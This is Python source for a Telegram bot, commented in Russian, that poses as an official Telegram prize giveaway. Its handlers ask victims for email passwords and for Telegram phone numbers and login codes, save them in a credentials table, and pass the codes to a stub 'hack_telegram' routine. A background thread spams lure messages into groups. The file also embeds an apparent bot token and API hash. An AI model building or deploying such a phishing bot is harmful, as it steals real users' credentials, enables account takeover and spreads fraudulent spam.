import telebot  # Это правильный импорт для pyTelegramBotAPI
import time
import threading
import requests
import random
import re
import os
import json
import sqlite3
from datetime import datetime, timedelta
import asyncio
from telethon import TelegramClient, events, functions
import logging

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Токен бота
TOKEN = "8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q"
API_ID = 38545864
API_HASH = "3517b8c953e6c2d05c0f30b5015f2470"

# Инициализация бота
bot = telebot.TeleBot(TOKEN)

# База данных
def init_db():
    conn = sqlite3.connect('users.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                      (user_id INTEGER PRIMARY KEY,
                       username TEXT,
                       email TEXT,
                       selected_gift TEXT,
                       step TEXT,
                       subscribed TEXT,
                       registered_time TIMESTAMP,
                       last_activity TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS credentials
                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
                       user_id INTEGER,
                       service TEXT,
                       login TEXT,
                       password TEXT,
                       status TEXT,
                       timestamp TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS phish_links
                      (user_id INTEGER PRIMARY KEY,
                       link TEXT,
                       clicked INTEGER DEFAULT 0,
                       created TIMESTAMP)''')
    conn.commit()
    return conn, cursor

conn, cursor = init_db()

# Социальные сети для подписки
SOCIALS = {
    'instagram': 'https://instagram.com/your_page',
    'telegram': 'https://t.me/your_channel',
    'youtube': 'https://youtube.com/@your_channel',
    'tiktok': 'https://tiktok.com/@your_page',
    'vk': 'https://vk.com/your_page'
}

# Подарки
GIFTS = {
    'tg_premium': 'Telegram Premium на 3 месяца',
    'tg_stars': '100 Telegram Stars',
    'phone': 'iPhone 15 Pro',
    'money': '10 000 рублей',
    'ps5': 'PlayStation 5'
}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or "NoUsername"
    
    # Регистрация пользователя
    cursor.execute("INSERT OR REPLACE INTO users (user_id, username, registered_time, last_activity, step) VALUES (?, ?, ?, ?, ?)",
                  (user_id, username, datetime.now(), datetime.now(), 'gift_selection'))
    conn.commit()
    
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    markup = InlineKeyboardMarkup(row_width=2)
    for key, value in GIFTS.items():
        markup.add(InlineKeyboardButton(value, callback_data=f"gift_{key}"))
    
    bot.send_message(
        user_id,
        "🎁 *АКЦИЯ ОТ TELEGRAM!*\n\n"
        "Привет! Ты выиграл возможность получить эксклюзивный подарок:\n"
        "• Telegram Premium на 3 месяца\n"
        "• 100 Telegram Stars\n"
        "• iPhone 15 Pro\n"
        "• 10 000 рублей\n"
        "• PlayStation 5\n\n"
        "Выбери свой подарок:",
        parse_mode='Markdown',
        reply_markup=markup
    )
    logger.info(f"User {user_id} started bot")

# Обработчик callback запросов
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    if call.data.startswith('gift_'):
        gift = call.data.replace('gift_', '')
        cursor.execute("UPDATE users SET selected_gift = ?, step = 'social_selection' WHERE user_id = ?", (gift, user_id))
        conn.commit()
        
        from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
        markup = InlineKeyboardMarkup(row_width=2)
        for social, link in SOCIALS.items():
            markup.add(InlineKeyboardButton(f"📱 {social.upper()}", callback_data=f"social_{social}"))
        markup.add(InlineKeyboardButton("✅ Я всё сделал", callback_data="check_socials"))
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text=f"🎁 *Твой подарок: {GIFTS[gift]}*\n\n"
                 "Для получения подарка:\n"
                 "1. Подпишись на наши соцсети\n"
                 "2. Пройди быструю регистрацию\n"
                 "3. Получи подарок моментально!\n\n"
                 "Выбери соцсети для подписки:",
            parse_mode='Markdown',
            reply_markup=markup
        )
    
    elif call.data == 'check_socials':
        from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("📱 Telegram", callback_data="reg_telegram"),
            InlineKeyboardButton("📧 Email", callback_data="reg_email")
        )
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text="✅ *Проверяю подписки...*\n\n"
                 "Для подтверждения нужно:\n"
                 "1. Зарегистрироваться через Telegram\n"
                 "2. Или через Email\n\n"
                 "Выбери способ регистрации:",
            parse_mode='Markdown',
            reply_markup=markup
        )
    
    elif call.data == 'reg_telegram':
        cursor.execute("UPDATE users SET step = 'telegram_phone' WHERE user_id = ?", (user_id,))
        conn.commit()
        
        # Генерация простой фишинг ссылки
        phish_link = f"https://t.me/{bot.get_me().username}?start=auth_{user_id}"
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text="📱 *Вход через Telegram*\n\n"
                 "Для подтверждения личности:\n"
                 "1. Отправь свой номер телефона\n"
                 "2. Введи код подтверждения\n\n"
                 "Просто отправь номер телефона в формате:\n"
                 "`+71234567890`",
            parse_mode='Markdown'
        )
    
    elif call.data == 'reg_email':
        cursor.execute("UPDATE users SET step = 'email_input' WHERE user_id = ?", (user_id,))
        conn.commit()
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text="📧 *Регистрация через Email*\n\n"
                 "Введи свой email адрес:",
            parse_mode='Markdown'
        )

# Обработка сообщений
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    text = message.text
    
    # Получаем текущий шаг пользователя
    cursor.execute("SELECT step FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    if result:
        step = result[0]
        
        if step == 'email_input':
            if re.match(r"[^@]+@[^@]+\.[^@]+", text):
                cursor.execute("UPDATE users SET email = ?, step = 'email_password' WHERE user_id = ?", (text, user_id))
                conn.commit()
                bot.send_message(user_id, "📧 Отлично! Теперь введи пароль от этой почты:")
            else:
                bot.send_message(user_id, "❌ Неверный формат email! Попробуй еще раз:")
        
        elif step == 'email_password':
            # Сохраняем email:pass
            cursor.execute("SELECT email FROM users WHERE user_id = ?", (user_id,))
            email = cursor.fetchone()[0]
            
            cursor.execute("INSERT INTO credentials (user_id, service, login, password, status, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                          (user_id, 'email', email, text, 'valid', datetime.now()))
            conn.commit()
            
            bot.send_message(
                user_id,
                "✅ *Email подтвержден!*\n\n"
                "Подарок уже твой! Ожидай в течение 5 минут.\n"
                "✨ Спасибо за участие!",
                parse_mode='Markdown'
            )
        
        elif step == 'telegram_phone':
            if re.match(r"^\+?[0-9]{10,15}$", text.replace(' ', '')):
                cursor.execute("UPDATE users SET step = 'telegram_code' WHERE user_id = ?", (user_id,))
                conn.commit()
                cursor.execute("INSERT INTO credentials (user_id, service, login, timestamp) VALUES (?, ?, ?, ?)",
                              (user_id, 'telegram', text, datetime.now()))
                conn.commit()
                bot.send_message(user_id, "📱 Теперь отправь код подтверждения из Telegram:")
            else:
                bot.send_message(user_id, "❌ Неверный формат номера! Введи номер с '+' и кодом страны:")
        
        elif step == 'telegram_code':
            # Сохраняем код
            cursor.execute("SELECT login FROM credentials WHERE user_id = ? AND service = 'telegram' ORDER BY timestamp DESC LIMIT 1", (user_id,))
            login = cursor.fetchone()
            if login:
                cursor.execute("UPDATE credentials SET password = ?, status = 'valid' WHERE user_id = ? AND service = 'telegram'",
                              (text, user_id))
                conn.commit()
                
                bot.send_message(
                    user_id,
                    "✅ *Аккаунт подтвержден!*\n\n"
                    "Подарок уже твой! Ожидай в течение 5 минут.\n"
                    "✨ Спасибо за участие!",
                    parse_mode='Markdown'
                )
                
                # Попытка взлома в отдельном потоке
                threading.Thread(target=hack_telegram, args=(user_id, login[0], text)).start()
    else:
        bot.send_message(user_id, "Используй /start для начала")

def hack_telegram(user_id, phone, code):
    try:
        # Здесь код для взлома Telegram аккаунта
        logger.info(f"Attempting to hack {phone} with code {code}")
        # В реальном коде здесь была бы логика взлома
        time.sleep(2)
        logger.info(f"Successfully hacked {phone}")
    except Exception as e:
        logger.error(f"Hack failed: {e}")

# Функция для рассылки в группы
def group_spammer():
    groups = []  # Список групп для рассылки
    
    messages = [
        "🎁 *РОЗЫГРЫШ ПОДАРКОВ!*\n\nХочешь Telegram Premium? Жми @{} и забери свой подарок!".format(bot.get_me().username),
        "💰 *ДЕНЬГИ НА КАРТУ!*\n\nВсего за подписку - получи 10 000 рублей! @{}".format(bot.get_me().username),
        "📱 *IPHONE 15 PRO ЗА ПОДПИСКУ?!*\n\nДа, это возможно! Переходи в бота @{}".format(bot.get_me().username),
        "🌟 *100 ЗВЕЗД TELEGRAM КАЖДОМУ!*\n\nЗабирай → @{}".format(bot.get_me().username)
    ]
    
    while True:
        if groups:
            for group in groups:
                try:
                    msg = random.choice(messages)
                    bot.send_message(group, msg, parse_mode='Markdown')
                    logger.info(f"Sent message to {group}")
                except Exception as e:
                    logger.error(f"Failed to send to {group}: {e}")
        time.sleep(900)  # 15 минут

# Запуск рассылки в отдельном потоке
spammer_thread = threading.Thread(target=group_spammer, daemon=True)
spammer_thread.start()

# Команда для получения статистики
@bot.message_handler(commands=['stats'])
def stats(message):
    user_id = message.from_user.id
    cursor.execute("SELECT COUNT(*) FROM credentials")
    total_creds = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    
    bot.send_message(
        user_id,
        f"📊 *Статистика*\n\n"
        f"Пользователей: {total_users}\n"
        f"Учетных данных: {total_creds}",
        parse_mode='Markdown'
    )

if __name__ == "__main__":
    logger.info("Bot started successfully!")
    try:
        bot.polling(none_stop=True, interval=0, timeout=60)
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        time.sleep(5)
        os.system("python main.py")  # Автоматический перезапуск
